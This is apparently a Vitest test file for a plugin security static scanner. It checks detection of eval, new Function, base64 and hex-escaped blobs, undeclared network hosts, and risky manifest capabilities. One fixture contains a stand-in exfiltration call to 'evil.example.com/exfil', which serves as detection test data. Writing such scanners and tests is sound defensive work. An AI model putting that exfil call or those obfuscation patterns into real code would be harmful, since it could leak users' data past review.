import { describe, it, expect } from "vitest";
import { runStaticScan } from "../../src/lib/audit/static-scanner";
import type { ValidatedManifest } from "../../src/lib/publishing/manifest-schema";

function makeManifest(
  overrides: Partial<ValidatedManifest> = {},
): ValidatedManifest {
  return {
    id: "test",
    version: "1.0.0",
    capabilities: [],
    allowedHosts: [],
    storage: {},
    hooks: [],
    routes: [],
    admin: {},
    ...overrides,
  } as ValidatedManifest;
}

describe("static-scanner", () => {
  it("returns no findings for clean code", () => {
    const files = new Map<string, string>([
      ["src/index.ts", "export default { activate() { return 'hi'; } };"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.findings).toHaveLength(0);
    expect(result.dangerousPrimitiveCount).toBe(0);
    expect(result.undeclaredHosts).toHaveLength(0);
  });

  it("flags eval()", () => {
    const files = new Map<string, string>([
      ["src/index.ts", "export default { run(x) { return eval(x); } };"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.dangerousPrimitiveCount).toBeGreaterThan(0);
    expect(result.findings.some((f) => f.title.includes("eval"))).toBe(true);
  });

  it("flags new Function()", () => {
    const files = new Map<string, string>([
      ["src/index.ts", "const fn = new Function('return 1');"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.findings.some((f) => f.title.includes("Function"))).toBe(true);
  });

  it("flags long base64 literals", () => {
    const blob = "A".repeat(250);
    const files = new Map<string, string>([
      ["src/payload.ts", `const data = "${blob}";`],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.findings.some((f) => f.title.includes("base64"))).toBe(true);
  });

  it("flags hex-escaped string sequences", () => {
    const escapes = "\\x6a".repeat(40);
    const files = new Map<string, string>([
      ["src/payload.ts", `const data = "${escapes}";`],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(
      result.findings.some((f) => f.title.includes("Hex-escaped")),
    ).toBe(true);
  });

  it("flags hosts referenced in code but not declared in allowedHosts", () => {
    const files = new Map<string, string>([
      [
        "src/index.ts",
        `fetch("https://evil.example.com/exfil"); fetch("https://api.openai.com/v1/x");`,
      ],
    ]);
    const result = runStaticScan(files, makeManifest({ allowedHosts: [] }));
    expect(result.undeclaredHosts).toContain("evil.example.com");
    expect(result.undeclaredHosts).toContain("api.openai.com");
    expect(
      result.findings.some((f) => f.title.includes("not declared")),
    ).toBe(true);
  });

  it("matches hosts via subdomain", () => {
    const files = new Map<string, string>([
      [
        "src/index.ts",
        `fetch("https://oauth2.googleapis.com/token");`,
      ],
    ]);
    const result = runStaticScan(
      files,
      makeManifest({ allowedHosts: ["googleapis.com"] }),
    );
    expect(result.undeclaredHosts).toHaveLength(0);
  });

  it("matches wildcard manifest entries", () => {
    const files = new Map<string, string>([
      [
        "src/index.ts",
        `fetch("https://www.facebook.com/share");`,
      ],
    ]);
    const result = runStaticScan(
      files,
      makeManifest({ allowedHosts: ["*.facebook.com"] }),
    );
    expect(result.undeclaredHosts).toHaveLength(0);
  });

  it("warns when network:fetch:any is declared", () => {
    const files = new Map<string, string>();
    const result = runStaticScan(
      files,
      makeManifest({ capabilities: ["network:fetch:any"] }),
    );
    expect(
      result.findings.some((f) => f.title.includes("unrestricted network")),
    ).toBe(true);
  });

  it("warns when read:users is declared", () => {
    const files = new Map<string, string>();
    const result = runStaticScan(
      files,
      makeManifest({ capabilities: ["read:users"] }),
    );
    expect(result.findings.some((f) => f.title.includes("user data"))).toBe(true);
  });

  it("warns when email:intercept is declared", () => {
    const files = new Map<string, string>();
    const result = runStaticScan(
      files,
      makeManifest({ capabilities: ["email:intercept"] }),
    );
    expect(
      result.findings.some((f) => f.title.includes("intercepts outbound email")),
    ).toBe(true);
  });

  it("ignores manifest.json itself when scanning for primitives", () => {
    const files = new Map<string, string>([
      [
        "manifest.json",
        // Even though this contains the string "eval", it's the manifest
        '{"id":"x","version":"1.0.0","description":"this plugin does not eval()"}',
      ],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.dangerousPrimitiveCount).toBe(0);
  });
});
